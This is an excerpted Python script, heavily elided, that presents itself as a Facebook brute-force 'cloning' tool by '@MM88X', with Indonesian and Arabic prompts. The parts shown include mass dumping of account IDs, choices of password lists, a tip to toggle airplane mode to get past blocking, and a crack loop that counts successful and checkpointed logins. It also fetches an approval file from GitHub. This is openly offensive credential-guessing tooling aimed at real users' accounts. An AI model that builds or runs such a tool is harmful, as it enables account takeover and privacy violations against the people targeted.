...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96m@mm88x ')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Whitedevils0/Approve.txt/blob/main/Approve.txt').text
		ua=open('.bbnew.txt','w')
...
def banner():
	clear()
	print("""
BRUTEFORCE FOR FACEBOOK BY @MM88X
""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}•{u}] INPUT COOKIES ضع الكوكيز :{asu} ')
		...
		print(f'  {u}[{h}MAHENDRA{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	alvino_xy(f'{h} IP : {ip}')
	print('')
	cetak('[bold green] 1. PUBLIC CLONING : من الاصدقاء\n 2. FILE CLONING : من ملف\n 3. CHECK RESULTS\n 0. EXIT [bold green]')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('• ENTER THE NUMBERS OF ID YOU WANT TO CLONE عدد الايديات  : '))
	except ValueError:
...
#		method.append('touch')
		...
		method.append('mobile')
	pwplus=input('•  PASSWORD (M اختياري) (D عشوائي)[M/D] ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	print("\x1b[1;97mعند الحضر قم بتشغيل وايقاف وضع الطيران")
	alvino_xy(f'{x}----------------------------------------------------------------')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[kid ]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]×[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
